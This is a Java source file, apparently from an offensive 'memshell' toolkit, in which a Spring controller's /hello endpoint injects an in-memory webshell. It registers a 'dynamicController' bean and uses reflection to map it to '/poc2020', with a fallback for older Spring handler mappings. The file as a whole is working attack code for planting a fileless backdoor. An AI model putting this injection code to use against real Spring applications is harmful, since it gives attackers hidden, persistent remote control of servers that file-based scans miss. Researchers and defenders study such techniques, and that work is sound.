package com.memshell.spring;

import com.memshell.generic.Util;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.support.XmlWebApplicationContext;
import java.lang.reflect.Method;
import java.util.Set;

@Controller
public class ControllerBased{

    @RequestMapping("/hello")
    public String say() {
        System.out.println("[+] Hello, Spring");

        Class clazz = Util.getDynamicControllerTemplateClass();

        XmlWebApplicationContext context = null;
        try{
            context = (XmlWebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        }catch(Exception e){
            context = (XmlWebApplicationContext)ContextLoader.getCurrentWebApplicationContext();
        }

        try{
            // 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
            context.getBeanFactory().registerSingleton("dynamicController", clazz.newInstance());
        }catch(Exception e){
            System.out.println(e);
            //continue
        }


        try{
            Object requestMappingHandlerMapping = context.getBean(Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping"));
            // 防止重复添加，重复添加会导致不可用
            Object obj = requestMappingHandlerMapping.getClass().getMethod("getHandlerMethods").invoke(requestMappingHandlerMapping);
            Method method = obj.getClass().getMethod("keySet");
            method.setAccessible(true);
            Set mappingInfos = (Set)method.invoke(obj);
            for(Object requestMappingInfo : mappingInfos){
                if(requestMappingInfo.toString().contains("/poc2020")){
                    return "failed";
                }
            }
            method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("detectHandlerMethods", Object.class);
            method.setAccessible(true);
            method.invoke(requestMappingHandlerMapping, "dynamicController");
            return "success";
        }catch(Exception e){
            System.out.println(e);
            //continue;
        }

        try{
            // 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
            Object dh = context.getBean(Class.forName("org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping"));
            // 3. 反射获得 registerHandler Method
            Method method = Class.forName("org.springframework.web.servlet.handler.AbstractUrlHandlerMapping").getDeclaredMethod("registerHandler", String.class, Object.class);
            method.setAccessible(true);
            // 4. 将 dynamicController 和 URL 注册到 handlerMap 中
            method.invoke(dh, "/poc2020", "dynamicController");
            return "success";
        }catch(Exception e){
            System.out.println(e);
            //continue
        }

        return "failed";
    }
}